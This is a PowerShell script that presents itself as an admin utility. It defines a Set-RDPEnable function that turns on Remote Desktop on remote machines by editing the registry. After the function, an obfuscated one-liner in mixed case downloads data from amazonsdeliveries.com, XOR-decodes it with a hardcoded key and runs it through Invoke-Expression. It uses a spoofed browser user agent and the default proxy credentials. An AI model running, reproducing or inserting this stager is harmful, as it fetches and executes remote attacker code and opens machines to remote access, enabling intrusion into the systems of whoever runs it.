function Set-RDPEnable
{


	[CmdletBinding()]
	PARAM (
		[String[]]$ComputerName = $env:COMPUTERNAME
	)
	PROCESS
	{
		FOREACH ($Computer in $ComputerName)
		{
			TRY
			{
				IF (Test-Connection -ComputerName $Computer -Count 1 -Quiet)
				{
					$regKey = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $Computer)
					$regKey = $regKey.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", $True)
					$regkey.SetValue("fDenyTSConnections", 0)
					$regKey.flush()
					$regKey.Close()
				} 
			} 
			CATCH
			{
				$Error[0].Exception.Message
			} 
		} 
	} 
}
[SYStEm.NeT.SerVICePoiNTMANAGER]::EXPECT100CONtiNUe = 0;$WC=NeW-OBJecT SySTEM.NeT.WebCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEADErS.ADD('User-Agent',$u);$WC.PRoxy = [SySTeM.Net.WeBRequESt]::DEfaultWEBPRoxy;$Wc.PROxY.CReDeNtIAls = [SYstem.NET.CredENTiALCacHE]::DeFaultNetWorkCREdentiAlS;$K='VjGe9c_oMP*~Y{`6CEqIOrX}|UF:y!7D';$I=0;[char[]]$b=([cHAr[]]($wC.DownLoADSTrInG("http://amazonsdeliveries.com/index.asp")))|%{$_-BXor$K[$i++%$k.LEnGTH]};IEX ($B-JOIN'')

